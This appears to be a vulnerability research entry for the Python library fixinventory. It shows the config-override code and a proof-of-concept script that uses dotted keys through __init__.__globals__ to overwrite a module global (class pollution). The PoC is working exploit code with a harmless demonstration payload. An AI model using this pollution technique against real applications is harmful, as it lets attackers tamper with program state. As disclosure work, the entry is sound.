## fixinventory

### Meta

+ Library: fixinventory
+ Stars: 1.6K
+ Version: 4.2.0
+ CVE: N/A
+ Status: Pending
+ Payload: ```ArgumentParser.args.config_override = ["configtest.__init__.__globals__.__name__=polluted"]; fixlib.config.Config.override_config(running_config)```
+ Foundby: Zhong
+ Report: Pending
+ Type: App
+ Exploitability: Low

### Library

https://github.com/someengineering/fixinventory

### Vulnerable Code Snippet

```python
@staticmethod
def override_config(running_config: RunningConfig) -> None:
    if getattr(ArgumentParser.args, "config_override", None) is None:
        return
    for override in getattr(ArgumentParser.args, "config_override", []):
        try:
            # ... Ignore for Concise
            config_keys = config_key.split(".")
            num_keys = len(config_keys)
            config_part = running_config.data
            set_value = False


            # ... Ignore for Concise
            for num_key, key in enumerate(config_keys):
                if num_key == num_keys - 1:
                    set_value = True
                    log.debug(f"Overriding config key {config_key}")

                if hasattr(config_part, key):
                    attr_value = getattr(config_part, key)
                    if set_value:
                        config_value = Config.cast_target_type(config_value, attr_value, fallback_target_type)
                        setattr(config_part, key, config_value)
                    else:
                        config_part = attr_value
                elif isinstance(config_part, dict) and key in config_part:
                    attr_value = config_part[key]
                    if set_value:
                        config_value = Config.cast_target_type(config_value, attr_value, fallback_target_type)
                        config_part[key] = config_value
                    else:
                        config_part = attr_value
                else:
                    log.error(f"Override key {config_key} is unknown - skipping")
                    break

            # ... Ignore for Concise
```
### PoC

```python
# PoC Snippets largely derived from offical test script
import fixlib.config as config
from fixlib.args import get_arg_parser, ArgumentParser
from typing import ClassVar, Dict, Any
from attrs import define, field

@define
class NestedConfigTest:
    kind: ClassVar[str] = "nested_config_test"
    myint: int = field(default=0, metadata={"description": "My Int"})
    mystr: str = field(default="Hello", metadata={"description": "My String"})
    mydict: Dict[str, Any] = field(factory=lambda: {"foo": "bar", "abc": {"def": "ghi"}})
@define
class ConfigTest:
    kind: ClassVar[str] = "configtest"
    testvar1: str = field(default="testing123", metadata={"description": "A test string"})
    testvar2: int = field(default=12345, metadata={"description": "A test integer"})
    testvar3: NestedConfigTest = field(
        factory=lambda: NestedConfigTest(),
        metadata={"description": "A test of nested config"},
    )

cfg = config.Config("test")
cfg.add_config(ConfigTest)
cfg.init_default_config()
ArgumentParser.args.config_override = [
    "configtest.__init__.__globals__.__attr_factory_testvar3.__globals__.__name__=polluted",
]
cfg.override_config(cfg.running_config)
print(__name__)
```